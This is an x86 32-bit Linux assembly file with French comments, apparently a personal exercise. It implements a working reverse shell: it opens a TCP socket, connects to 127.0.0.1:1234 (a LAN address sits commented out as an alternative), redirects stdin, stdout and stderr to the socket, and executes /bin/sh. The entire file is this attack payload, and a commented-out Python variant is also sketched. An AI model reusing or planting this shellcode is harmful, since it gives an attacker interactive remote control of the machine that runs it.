;DOCS :
; syscall : https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit
; net.h : (pour les appels) https://students.mimuw.edu.pl/SO/Linux/Kod/include/net/net.h.html
; Equivalent en C pris comme exemple : https://gist.github.com/0xabe-io/916cf3af33d1c0592a90

section .data


section .text
    global _start
_start:



 
    ;push de tous les registres pour la sauvegarde
    pusha
    ;create_socket 
    push 0x66  ; voir syscall
    pop eax
    push 0x1 ; voir net.h 
    pop ebx
    xor ecx,ecx 
    push ecx ; IPPROTO_IP
    push 1  ; SOCK_STREAM 
    push 2 ; AF_INET 
    mov ecx,esp 
    int 0x80


    mov edi,eax ; on récupère le file descriptor = ID du socket
    
    ;create_addr_struct - Le "word" permet de pas décaler et de pas sortir de la structure
    push 0x0101017f ; ip loopback(127.0.0.1) si besoin
    ;push 0x1D01A8C0 ; my ip 192.168.1.29
    push word 0xD204 ; port 1234
    push word 2 ; AF-INET -> IPv4
    mov ecx,esp ;  on récupère le pointeur pour le mettre dans ecx

    ;connect
    push 16  ; size of struct = valeur trouvé sur internet
    push ecx ; pointeur struct addr
    push edi ; file descriptor
    mov ecx,esp ;  on récupère le pointer pour le mettre dans ecx

    ;syscall à sys_connect qui vaut 3 (voir net.h)
    mov al,102 ; Socketcall
    mov bl,3 ; Sysconnect
    int 80h



    ;dup2  stdin=0 (voir syscall)
    xor ecx,ecx
    mov al, 63
    mov ebx, edi
    int 80h

    ;dup2 stdout=1
    mov al, 63
    inc ecx
    int 80h

    ;dup2 stderr=2
    mov al, 63
    inc ecx
    int 80h
    
    ;;; Garantie un shell mais renvoie sur un shell pas beau

    ;execve ("/bin/bash",NULL,NULL) (voir syscall)
    mov al,11
    xor ebx,ebx 
    push ebx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    xor ecx, ecx

    int 80h
    


    ;;; Executable sur une machine uniquement équipée de python, mais renvoie un shell fortement utilisable

    ; mov al,11
    ; mov ebx, python ; on met le bash de la section .data dans ebx
    ; push 0
    ; push bash_arg
    ; push command
    ; push ebx
    ; mov ecx, esp
    ;int 80h

    
    add esp,48 ; Nous avons 12 push dans le code donc 4*12 = 48 
    popa  ; récupération de tous les registres
    

    jmp _exit

_exit:
    mov al, 1
    xor bl, bl
    int 80h

  
    